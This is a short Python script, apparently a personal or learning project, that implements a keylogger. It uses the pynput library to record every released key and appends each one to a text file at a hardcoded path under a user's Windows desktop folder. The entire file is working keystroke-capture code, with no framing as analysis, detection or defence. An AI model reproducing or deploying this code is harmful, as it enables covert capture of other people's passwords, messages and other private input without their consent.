import pynput

keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "w")
keylogger_txt.write(" ")
keylogger_txt.close()
keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "a")

def on_release(key):
    string = "{0}".format(key)
    keylogger_txt.write(f"{string}\n")

# Collect events until released
with pynput.keyboard.Listener(on_release=on_release) as listener:
    listener.join()